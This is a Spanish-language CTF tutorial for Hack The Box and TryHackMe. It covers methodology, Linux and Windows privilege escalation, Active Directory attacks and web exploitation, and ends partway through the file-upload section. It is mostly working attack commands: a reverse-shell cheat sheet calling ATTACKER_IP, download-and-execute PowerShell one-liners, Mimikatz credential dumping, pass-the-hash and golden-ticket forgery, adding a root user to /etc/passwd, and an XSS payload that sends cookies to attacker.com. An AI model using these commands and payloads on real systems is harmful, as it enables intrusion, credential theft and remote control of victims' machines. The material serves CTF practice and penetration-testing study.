# CTF — Hack The Box / TryHackMe

## Índice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (2868 lineas)


1. [Introduccion](#introduccion)
2. [Hack The Box](#hack-the-box)
3. [TryHackMe](#tryhackme)
4. [Metodologia CTF](#metodologia-ctf)
5. [Linux Privilege Escalation](#linux-privilege-escalation)
6. [Windows Privilege Escalation](#windows-privilege-escalation)
7. [Active Directory Attacks](#active-directory-attacks)
8. [Web Challenges](#web-challenges)
9. [Cryptography](#cryptography)
10. [Reverse Engineering](#reverse-engineering)
11. [PWN / Binary Exploitation](#pwn-binary-exploitation)
12. [Forensics](#forensics)
13. [Steganography](#steganography)
14. [Herramientas Esenciales](#herramientas-esenciales)
15. [Osueta Mental](#osueta-mental)
16. [Ejercicios Practicos](#ejercicios-practicos)
17. [Recursos](#recursos)

---

## 1. Introducción

Bienvenido al tutorial mas completo de [ctf](../raw/ctf-h4ckth3b0x.md), Hack The Box y [tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme) en espanol (argentino). Aca no solo vas a aprender a resolver maquinas, sino a pensar como un atacante.

Esto no es un curso de teoria. Es una guia practica con metodologias, comandos, ejemplos, y ejercicios para que te conviertas en un experto en CTFs.

Que vas a aprender:
- Como funciona [htb](../raw/ctf-h4ckth3b0x.md#hackthebox) y THM (free vs pago)
- Metodologia paso a paso para resolver maquinas
- Linux y Windows [privilege escalation](../raw/l1n9x-pr1v3sc.md)
- [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md) attacks
- Web, crypto, reverse, pwn, forensics, stego
- Herramientas esenciales
- La mentalidad correcta para no frustrarte

---

## 2. Hack The Box

### 2.1. Plataforma

[htb](../raw/ctf-h4ckth3b0x.md#hackthebox) es la plataforma de hacking mas popular del mundo. Tiene:
- Maquinas (vivas, retiradas)
- Challenges (web, crypto, pwn, forensics, stego)
- Fortress (lab multi-maquina)
- Sherlocks (blue team / forensics)
- Endgames ([red team](../raw/r3d-t34m-1nfr4.md) scenarios)
- Pro Labs (laboratorios empresariales)

### 2.2. Free vs VIP

| Caracteristica | Free | VIP |
|---------------|------|-----|
| Maquinas activas | Solo 1 por semana | Todas |
| Maquinas retiradas | No | Si (~100+) |
| Conexion simultanea | 1 | 2 |
| [vpn](../raw/4n0n1m4t0.md#vpn) servers | 2 | 5+ |
| Challenges | Solo demo | Todos |
| Fortress | No | Si |
| Pro Labs | No | No (pago extra) |
| Precio | Gratis | /mes |

### 2.3. Empezando en HTB

```bash
# 1. Registrarse en https://hackthebox.com
# 2. Conectar VPN (Linux)
wget https://labs.hackthebox.com/vpn/YOUR_VPN_FILE
sudo openvpn YOUR_VPN_FILE.ovpn

# 3. Verificar conexion
ping 10.10.10.10  # IP de la maquina
ip a show tun0    # Ver IP de VPN

# 4. Flags
# user.txt -> /home/user/user.txt o C:\Users\user\user.txt
# root.txt -> /root/root.txt o C:\Users\Administrator\admin.txt
```

### 2.4. Starting Point (Gratis)

HTB tiene un Starting Point para principiantes:
- Maquinas gratis sin VIP
- Categorias: Very Easy, Easy
- Tier 0, Tier 1, Tier 2
- Guias incluidas

```bash
# Tier 0 examples:
# Meow (telnet, default creds)
# Fawn (FTP anonymous)
# Dancing (SMB null session)
# Redeemer (Redis no auth)

# Tier 1 examples:
# Appointment (SQLi)
# Sequel (MySQL default)
# Crocodile (FTP + web)
# Responder (SMB)
```

### 2.5. Maquinas Activas vs Retiradas

- **Activas**: Las que estan en el ranking actual (unas 20-30)
- **Retiradas**: Se archivan cuando salen nuevas (100+ disponibles con VIP)
- **Temporada**: Grupo de maquinas con tematica comun
- **Dificultad**: Very Easy, Easy, Medium, Hard, Insane

### 2.6. Tracks

HTB organiza maquinas en tracks:
- **Intro to HTB**: Primeras maquinas para principiantes
- **Linux [privesc](../raw/l1n9x-pr1v3sc.md)**: Maquinas enfocadas en escalada Linux
- **Windows PrivEsc**: Maquetas enfocadas en escalada Windows
- **[active directory](../raw/w1nd0ws-d0m41n-4dm1n.md)**: Maquinas con [ad](../raw/w1nd0ws-d0m41n-4dm1n.md)
- **[cve](../raw/s3c-f0nd4m3nt0s.md#cve) Focused**: Maquinas basadas en CVEs especificos
- **Web Requests**: Maquinas web


---

## 4. Metodologia [ctf](../raw/ctf-h4ckth3b0x.md)

### 4.1. Approach General

Resolver maquinas de CTF requiere un approach estructurado:

1. **Escaneo Inicial**: [nmap](../raw/nm4p.md) para descubrir puertos abiertos
2. **Enumeracion**: Identificar servicios, versiones, configs
3. **Foothold**: Encontrar vector de entrada ([exploit](../raw/m3t4spl01t.md#exploits), credencial, config)
4. **[escalada de privilegios](../raw/l1n9x-pr1v3sc.md)**: Obtener maximo acceso (root/Administrator)
5. **Flags**: user.txt, root.txt

### 4.2. Notas y Organizacion

```bash
# Estructura de directorios recomendada
mkdir -p {nmap,content,exploits,post}

# Notas en markdown
cat > notes.md << 'EOF'
# Target: 10.10.10.XXX
## Ports
- 22/tcp SSH OpenSSH X.X
- 80/tcp HTTP Apache X.X
- 445/tcp SMB

## Usuarios
- www-data (low priv)
- juan (user flag)
- root

## Metodologia
1. Nmap -> 80,445
2. Gobuster -> /admin, /backup
3. Backup contiene credenciales
4. SSH con credenciales -> user.txt
5. SUID binary -> PE -> root.txt
EOF
`````

### 4.3. Nmap Automatizado

```bash
# Script de escaneo rapido
cat > quick_scan.sh << 'SCRIPT'
#!/bin/bash
IP=$1
mkdir -p nmap

# Quick scan
nmap -p- --min-rate=5000 -sS -T4 $IP -oN nmap/ports.txt 2>/dev/null

# Extract ports and scan them in detail
PORTS=$(cat nmap/ports.txt | grep "^[0-9]" | cut -d "/" -f 1 | tr "
" ",")
if [ ! -z "$PORTS" ]; then
    nmap -p $PORTS -sC -sV -T4 $IP -oN nmap/detailed.txt 2>/dev/null
fi

# UDP top 20
nmap -sU --top-ports 20 $IP -oN nmap/udp.txt 2>/dev/null

cat nmap/detailed.txt
SCRIPT

chmod +x quick_scan.sh
`````

### 4.4. Web Enumeration Automation

```bash
cat > web_enum.sh << 'SCRIPT'
#!/bin/bash
URL=$1
DIR="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

gobuster dir -u $URL -w $DIR -t 50 -o web_dirs.txt 2>/dev/null
gobuster dir -u $URL -w $DIR -x php,txt,html,bak,zip,tar.gz -t 50 -o web_ext.txt 2>/dev/null
whatweb $URL
nikto -h $URL -o nikto.txt 2>/dev/null
curl -s -I $URL
SCRIPT
`````

### 4.5. [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells) Cheatsheet

```bash
# Linux - Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Linux - Python
python3 -c 'import socket,subprocess,s;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# Linux - PHP
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Linux - Netcat (if installed)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Windows - PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"

# Windows - Nishang
# Download and run: iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port PORT
`````

### 4.6. TTY Upgrade

```bash
# Python
python3 -c "import pty;pty.spawn('/bin/bash')"

# After python3, background (Ctrl+Z), then:
stty raw -echo; fg
# Then press Enter twice, then:
reset
export TERM=xterm
export SHELL=bash

# One-liner (script)
script /dev/null -c bash
`````

---

## 5. Linux [privilege escalation](../raw/l1n9x-pr1v3sc.md)

### 5.1. Enumeracion Automatica

```bash
# LinPEAS
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# LinEnum
wget http://ATTACKER_IP/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Linux Smart Enumeration
wget http://ATTACKER_IP/lse.sh
chmod +x lse.sh
./lse.sh -l 2
`````

### 5.2. Enumeracion Manual

```bash
# Kernel version
uname -a
cat /etc/os-release
cat /proc/version

# User info
whoami; id; sudo -l
cat /etc/passwd | grep -v nologin
cat /etc/shadow 2>/dev/null

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null

# Sudo abuse
sudo -l
# Look for binaries that can be run as root

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
find / -name "cron*" -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null

# SSH keys
find / -name "id_rsa" -type f 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.viminfo

# Network
ss -tulpn
netstat -anp
ip addr; ip route

# Processes
ps aux --forest
ps auwwwx

# Docker
cat /proc/1/cgroup | grep docker
docker ps
ls -la /var/run/docker.sock


### 5.3. Kernel Exploits

```bash
# Check kernel version
uname -a

# Search for exploits
# Dirty Pipe (CVE-2022-0847) - Linux 5.8+
# PwnKit (CVE-2021-4034) - pkexec
# Dirty COW (CVE-2016-5195) - Linux 2.6.22+
# OverlayFS (CVE-2021-3493)
# Stack Clash (CVE-2017-1000367)

# Linux Exploit Suggester
wget [http](../raw/r3d3s-f0nd4m3nt0s.md#http)://ATTACKER_IP/les.sh
[chmod](../raw/0s-f0nd4m3nt0s.md#permisos) +x les.sh
./les.sh
`````

### 5.4. SUID Binaries

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Common SUID to check:
# /usr/bin/su
# /usr/bin/sudo
# /usr/bin/passwd
# /usr/bin/gpasswd
# /usr/bin/chsh
# /usr/bin/fusermount
# /usr/bin/ntfs-3g
# /usr/bin/mount
# /usr/bin/umount
# /usr/bin/pkexec
# /usr/bin/screen
# /usr/bin/vmware-user-suid-wrapper
# /usr/lib/policykit-1/polkit-agent-helper-1

# Check GTFOBins for each SUID binary
# https://gtfobins.github.io/

# Example: SUID python
# python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Example: SUID nmap
# nmap --interactive
# !sh

# Example: SUID find
# find . -exec /bin/sh -p \;

# Example: SUID vim
# vim -c ':!/bin/sh'
`````

### 5.5. Sudo Abuse

```bash
# Check sudo permissions
[sudo](../raw/l1n9x-pr1v3sc.md#sudo) -l

# Common sudo entries:
# (root) NOPASSWD: /usr/bin/vim
# (root) NOPASSWD: /usr/bin/less
# (root) NOPASSWD: /usr/bin/more
# (root) NOPASSWD: /usr/bin/cp
# (root) NOPASSWD: /usr/bin/mv
# (root) NOPASSWD: /usr/bin/apt
# (root) NOPASSWD: /usr/bin/pip
# (root) NOPASSWD: /usr/bin/tee
# (root) NOPASSWD: /usr/bin/tar
# (root) NOPASSWD: /usr/bin/zip
# (root) NOPASSWD: /usr/bin/sed
# (root) NOPASSWD: /usr/bin/awk
# (root) NOPASSWD: /usr/bin/ftp
# (root) NOPASSWD: /usr/bin/man
# (root) NOPASSWD: /usr/bin/less
# (root) NOPASSWD: /usr/bin/rsync
# (root) NOPASSWD: /usr/bin/cut
# (root) NOPASSWD: /usr/bin/strings

# Exploit examples:
# sudo vim -c ':!/bin/sh'
# sudo less /etc/shadow
# sudo awk 'BEGIN {system("/bin/sh")}'
# sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# sudo zip -1 -r /dev/null /dev/null -T --unzip-command="sh -c /bin/sh"

# CVE-2019-14287 sudo bypass
# sudo -u#-1 /bin/bash
# sudo -u#4294967295 /bin/bash
`````

### 5.6. Cron Jobs

```bash
# Check system cron
cat /etc/crontab
ls -la /etc/[cron](../raw/l1n9x-pr1v3sc.md#cron-jobs).d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Check user crons
crontab -l

# Check writable cron scripts
find /etc/cron* -writable -type f 2>/dev/null

# Wildcard injection in cron
# If a cron job runs: tar czf /tmp/backup.tar.gz *
# Create files: --checkpoint=1 --checkpoint-action=exec=sh shell.sh

# PATH hijacking in cron
# If PATH=/tmp:/usr/bin in crontab
# Create /tmp/command.sh that runs our payload
`````

### 5.7. Capabilities

```bash
# List capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid+ep - Set UID (can escalate to root)
# cap_net_raw+ep - Raw sockets
# cap_net_admin+ep - Network admin
# cap_sys_admin+ep - System admin
# cap_sys_ptrace+ep - Debug processes
# cap_dac_override+ep - Bypass file permissions
# cap_chown+ep - Change file ownership
# cap_fowner+ep - Bypass file ownership

# Exploit cap_setuid+ep on python
# /usr/bin/python3 has cap_setuid+ep
python3 -c "import os; os.setuid(0); os.system('/bin/sh')"

# Exploit cap_net_raw+ep (tcpdump)
[tcpdump](../raw/r3d3s-f0nd4m3nt0s.md#tcpdump) -i any -w /tmp/[payload](../raw/m3t4spl01t.md#payloads).pcap -z ./shell.sh

# Exploit cap_dac_override+ep
# Read any file:
cp /etc/shadow /tmp/shadow
`````

### 5.8. Shared Libraries

```bash
# LD_PRELOAD abuse
# If you can set LD_PRELOAD when running a sudo command:
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/somebin

# Create evil.so:
# cat evil.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
# gcc -fPIC -shared -o evil.so evil.c -nostartfiles

# LD_LIBRARY_PATH abuse
# If program loads shared libs from a path we control

# RPATH/RUNPATH
# Check binary's RPATH: readelf -d binary | grep RPATH
# If RPATH points to writable directory, create a malicious library
`````

### 5.9. NFS Share

```bash
# Check /etc/exports
cat /etc/exports 2>/dev/null
# Look for: /directory *(rw,no_root_squash)
# no_root_squash = files created as root remain as root

# Mount from attacker machine:
sudo mount -t nfs TARGET_IP:/directory /mnt/nfs

# Create SUID binary on mounted share as root
cat > shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    system("/bin/sh");
    return 0;
}
EOF
gcc shell.c -o shell
chmod u+s shell
# Execute from the target
`````

### 5.10. Docker/LXC Escape

```bash
# Check if we are in a container
cat /proc/1/cgroup | grep [docker](../raw/d0ck3r-f0r-h4ck3rs.md)
ls -la /.dockerenv

# Docker socket
ls -la /var/run/docker.sock
# If writable:
docker ps
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container
cat /proc/1/status | grep CapEff
# If full capabilities (000000xxxxxxffff):
# Mount host filesystem:
mkdir /mnt_host
mount /dev/sda1 /mnt_host
chroot /mnt_host

# LXC escape
# If in LXC container:
# Check /proc/1/root
`````

### 5.11. Writable /etc/passwd

```bash
# Check if /etc/passwd is writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt root newpassword
# Or: python3 -c "import crypt; print(crypt.crypt('password', crypt.mksalt(crypt.METHOD_SHA512)))"

# Add root user
echo "newroot:$(openssl passwd -1 -salt newroot pass123):0:0:root:/root:/bin/bash" >> /etc/passwd
su newroot
# Password: pass123
`````

### 5.12. Linux PE Checklist Rapida

```markdown
## Linux [privesc](../raw/l1n9x-pr1v3sc.md) Checklist

### System
- [ ] [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) version (searchsploit)
- [ ] OS version (cat /etc/os-release)
- [ ] Running processes (ps aux)
- [ ] Network connections (ss -tulpn)

### Users
- [ ] Current user (whoami; id; [sudo](../raw/l1n9x-pr1v3sc.md#sudo) -l)
- [ ] Users with shells (cat /etc/passwd | grep sh$)
- [ ] History files (.bash_history, .mysql_history)
- [ ] SSH keys (find / -name id_rsa 2>/dev/null)

### Files
- [ ] [suid](../raw/l1n9x-pr1v3sc.md#suid) binaries (find / -perm -4000)
- [ ] SGID binaries (find / -perm -2000)
- [ ] Writable files (find / -writable -type f)
- [ ] Writable directories (find / -writable -type d)
- [ ] [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities) (getcap -r / 2>/dev/null)

### Jobs
- [ ] [cron](../raw/l1n9x-pr1v3sc.md#cron-jobs) jobs (/etc/crontab, /etc/[cron](../raw/l1n9x-pr1v3sc.md#cron-jobs).d/)
- [ ] [systemd](../raw/l1n9x-4dm1n.md#systemd) timers (systemctl list-timers)

### Sudo
- [ ] Sudo permissions (sudo -l)
- [ ] [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2019-14287 (sudo -u#-1)

### Network
- [ ] Other hosts ([arp](../raw/r3d3s-f0nd4m3nt0s.md#arp) -a)
- [ ] Services listening locally (ss -tulpn | grep 127.0.0.1)

### Passwords
- [ ] Password in files (grep -r password /etc/ 2>/dev/null)
- [ ] Configuration files (find / -name *.conf 2>/dev/null)
- [ ] Backup files (*.bak, *.old, *.backup)


---

## 6. Windows [privilege escalation](../raw/l1n9x-pr1v3sc.md)

### 6.1. Enumeracion Automatica

```bash
# WinPEAS
certutil -urlcache -f http://ATTACKER_IP/winpeas.exe winpeas.exe
winpeas.exe
# Or: powershell -c "Invoke-WebRequest -Uri http://ATTACKER_IP/winpeas.exe -OutFile winpeas.exe"

# PowerUp
powershell -c "iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1'); Invoke-AllChecks"

# Sherlock
powershell -c "iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Sherlock.ps1'); Find-AllVulns"

# JAWS (PowerShell)
powershell -c "iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/jaws-enum.ps1')"
`````

### 6.2. Enumeracion Manual

```cmd
# System information
systeminfo
wmic os get Caption,Version,OSArchitecture
wmic computersystem get TotalPhysicalMemory,Manufacturer,Model

# User information
whoami
whoami /all
whoami /groups
net users
net user %USERNAME%
net localgroup
net localgroup Administrators

# Network
ipconfig /all
netstat -ano
arp -a
route print

# Processes
tasklist /v
tasklist /SVC
wmic process list full

# Services
wmic service list brief
sc query state=all
Get-Service

# Patches / Hotfixes
wmic qfe list brief
systeminfo | findstr /C:"KB"
Get-HotFix

# Auto-start
wmic startup list full
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Scheduled tasks
schtasks /query /fo LIST /v

# Stored credentials
cmdkey /list
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.txt *.ini *.xml *.config

# PowerShell history
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Unattended install files
dir /s *sysprep* *unattend* *autounattend* *.xml
`````

### 6.3. Service Exploitation

#### Unquoted Service Paths

```cmd
# Find services with unquoted paths
wmic service get name,displayname,pathname,startname | findstr /i /v "C:\Windows\" | findstr /i /v "\"
Get-CimInstance -ClassName Win32_Service | Where-Object { $$_.PathName -notmatch '"' -and $$_.PathName -ne $$null }

# Exploit:
# Service path: C:\Program Files\Company Name\Service.exe
# Create: C:\Program.exe (with malicious payload)
# Start service: sc start ServiceName
`````

#### Weak Service Permissions

```cmd
# Check service permissions
icacls "C:\Program Files\Vulnerable Service\service.exe"
accesschk.exe -uwcqv "Authenticated Users" *

# If we can modify the service binary or config:
# Replace service binary with malicious one
# Or change service path: sc config ServiceName binPath="C:\payload.exe"
# Start service: sc start ServiceName
`````

### 6.4. AlwaysInstallElevated

```cmd
# Check registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 1:
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o malicious.msi

# Upload and execute
msiexec /quiet /qn /i malicious.msi
`````

### 6.5. Token Privileges

```cmd
# Check privileges
whoami /priv

# Important privileges:
# SeImpersonatePrivilege - JuicyPotato / RoguePotato
# SeAssignPrimaryTokenPrivilege - Potato
# SeBackupPrivilege - Backup files/directories
# SeRestorePrivilege - Restore files
# SeTakeOwnershipPrivilege - Take ownership
# SeDebugPrivilege - Debug processes
# SeLoadDriverPrivilege - Load kernel drivers

# SeImpersonate + SeAssignPrimaryToken
# JuicyPotato:
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

# RoguePotato:
RoguePotato.exe -r ATTACKER_IP -e "powershell -c whoami"

# PrintSpoofer (Windows 10/Server 2019):
PrintSpoofer.exe -i -c cmd
`````

### 6.6. Credential Dumping

```cmd
# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::cache" "token::elevate" "exit"

# Save output to file
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > mimikatz_output.txt

# Dump SAM
reg save hklm\sam sam.save
reg save hklm\system system.save
# Offline with impacket:
impacket-secretsdump -sam sam.save -system system.save LOCAL

# Dump LSA secrets
reg save hklm\security security.save
impacket-secretsdump -security security.save -system system.save LOCAL

# PowerShell credential dump
powershell -c "iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
`````

### 6.7. Windows [pe](../raw/w1n-1nt3rn4ls.md#pe) Checklist

```markdown
## Windows PrivEsc Checklist

### System
- [ ] OS version (systeminfo)
- [ ] Patches applied (wmic qfe list brief)
- [ ] Architecture (64/32 bit)

### Users
- [ ] Current user privileges (whoami /priv)
- [ ] Current user groups (whoami /groups)
- [ ] Other users on system (net users)
- [ ] Autologon passwords (reg query)

### Services
- [ ] Running services (wmic service list brief)
- [ ] Writable service binaries
- [ ] Unquoted service paths
- [ ] Weak service permissions

### Applications
- [ ] Installed software (wmic product get name)
- [ ] AlwaysInstallElevated
- [ ] Scheduled tasks writable

### Registry
- [ ] Auto-run entries
- [ ] AlwaysInstallElevated
- [ ] Weak registry permissions

### Credentials
- [ ] Stored credentials (cmdkey /list)
- [ ] Unattended install files
- [ ] Configuration files with passwords
- [ ] PowerShell history
- [ ] Browser saved passwords

### Kernel
- [ ] Missing patches (Sherlock, Watson)
- [ ] Exploit suggester


---

## 7. Active Directory Attacks

### 7.1. AD Enumeration

```bash
# Linux tools
# ldapsearch
ldapsearch -x -H ldap://DC_IP -D "DOMAIN\\user" -w "password" -b "DC=domain,DC=[com](../raw/w1n-s9bsyst3ms.md#com)"

# BloodHound (Python)
[bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound)-[python](../raw/pyth0n-f0r-h4ck1ng.md) -u user -p "password" -d domain.com -dc dc.domain.com -c All -ns DC_IP

# CrackMapExec
crackmapexec [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) DC_IP -u user -p "password" --users
crackmapexec smb DC_IP -u user -p "password" --groups
crackmapexec smb DC_IP -u user -p "password" --pass-pol
crackmapexec smb DC_IP -u user -p "password" --sessions

# Impacket
impacket-GetADUsers domain.com/user:password -all
impacket-GetNPUsers domain.com/ -usersfile users.txt -format [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat)
impacket-GetUserSPNs domain.com/user:password -request
`````

### 7.2. Kerberoasting

```bash
# Request TGS for SPNs
impacket-GetUserSPNs domain.com/user:"password" -request -output hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt --force
`````

### 7.3. AS-REP Roasting

```bash
# Find users without Kerberos pre-authentication
impacket-GetNPUsers domain.com/ -usersfile users.txt -format hashcat -output hashes.txt

# Crack
hashcat -m 18200 hashes.txt rockyou.txt
`````

### 7.4. Pass-the-Hash

```bash
# With Impacket
impacket-psexec domain.com/user@target -hashes LMHASH:NTHASH
impacket-wmiexec domain.com/user@target -hashes LMHASH:NTHASH
impacket-smbexec domain.com/user@target -hashes LMHASH:NTHASH

# With CrackMapExec
crackmapexec smb target -u user -H NTHASH -x whoami

# With evil-winrm
evil-winrm -i target -u user -H NTHASH
`````

### 7.5. DCSync Attack

```bash
# Requires DA privileges
impacket-secretsdump -just-dc domain.com/admin:"password"@DC_IP
impacket-secretsdump -just-dc-ntlm domain.com/admin:"password"@DC_IP

# Using hash
impacket-secretsdump -just-dc domain.com/admin@DC_IP -hashes LMHASH:NTHASH
`````

### 7.6. Golden Ticket

```bash
# Requirements: KRBTGT hash + Domain SID
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.com -user Administrator

# Use the ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec domain.com/Administrator@target -k -no-pass
`````

### 7.7. Silver Ticket

```bash
# Requirements: Service NTHASH + Service SID
impacket-ticketer -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain domain.com -user Administrator -spn service/computer.domain.com

# Use the ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec domain.com/Administrator@target -k -no-pass
`````

### 7.8. Responder + NTLM Relay

```bash
# Start Responder
[responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) -I eth0 -dw

# Start NTLM relay
impacket-ntlmrelayx -tf targets.txt -smb2support -c whoami

# Force authentication (various methods)
# 1. SMB: crackmapexec smb target -u "" -p "" --shares
# 2. LLMNR/NBT-NS poisoning (Responder)
# 3. Printer bug (MS-RPRN abuse)
`````

### 7.9. ACL Abuse

```bash
# Check ACLs with BloodHound
# Look for:
# - GenericAll on user (reset password)
# - GenericAll on group (add user to group)
# - WriteOwner on object
# - WriteDACL on object
# - ForceChangePassword
# - AddMember to group

# Force password reset
net user target_user NewPass123! /domain

# Add to group
net group "Domain Admins" our_user /add /domain
`````

### 7.10. AD Attack Flow

```markdown
## [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) Attack Chain

1. Enumerate AD ([bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound), ldapsearch)
2. Initial foothold (web [exploit](../raw/m3t4spl01t.md#exploits), [phishing](../raw/ph1sh1ng.md), etc.)
3. Enumerate from inside (Powerview, BloodHound collector)
4. [kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting) / [as-rep roasting](../raw/w1nd0ws-d0m41n-4dm1n.md#as-rep-roasting)
5. Crack hashes offline ([hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat))
6. pass-the-[hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash) / Overpass-the-[hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions)
7. Lateral movement ([wmi](../raw/w1n-s9bsyst3ms.md#wmi), PSExec, WinRM)
8. [dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync) (if DA privileges obtained)
9. [golden ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#golden-ticket) persistence
`````

---

## 8. Web Challenges

### 8.1. SQL Injection

```bash
# Manual testing
' OR 1=1 --
' OR '1'='1
admin' --
1' ORDER BY 1--
1' UNION SELECT null,null--

# Blind testing
1' AND 1=1--
1' AND 1=2--
1' AND SLEEP(5)--

# Automated
[sqlmap](../raw/w3b-h4ck1ng.md#sqlmap) -u "[http](../raw/r3d3s-f0nd4m3nt0s.md#http)://target/page?id=1" --batch --level=3
sqlmap -r request.txt --batch --os-shell
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch
`````

### 8.2. XSS

```javascript
// Reflected
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Stored (comments, profiles, etc.)
<script>document.location='http://attacker.[com](../raw/w1n-s9bsyst3ms.md#com)/steal.php?c='+document.cookie</script>

// DOM-based
#<script>alert(1)</script>
javascript:alert(1)

// Blind [xss](../raw/w3b-h4ck1ng.md#xss)
<script src="http://attacker.com/hook.js"></script>
`````

### 8.3. LFI/RFI

```bash
# Local File Inclusion
http://target/page?file=../../../etc/passwd
http://target/page?file=....//....//....//etc/passwd
http://target/page?file=php://filter/convert.base64-encode/resource=index.php

# Remote File Inclusion
http://target/page?file=http://attacker.com/shell.txt
http://target/page?file=\\attacker\share\shell.txt

# Log poisoning
# Access: http://target/page?file=<?php system($_GET['c']);?>
# Then include /var/log/apache2/access.log with ?c=id

# /proc/self/environ
# Poison User-Agent header, then include /proc/self/environ
`````

### 8.4. SSTI

```python
# Jinja2
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}

# Twig
{{7*7}}
{{_self.env.registerUndefinedFilterCallback('exec')}}
{{_self.env.getFilter('id')}}

# FreeMarker
${7*7}
<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}
`````

### 8.5. Command Injection

```bash
# Basic
; id
| id
$(id)
`id```

# Blind
; sleep 5
| ping -c 5 127.0.0.1
`````

### 8.6. File Upload

```bash
# Extension bypass
shell.php
shell.php5
shell.phtml
shell.php7
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.php;.jpg

# Content-Type bypass
image/gif
image/png
image/jpeg

# Magic bytes bypass
GIF89a (for GIF)
\x89PNG (for PNG)
\xff\xd8\xff (for JPEG)

# Race condition
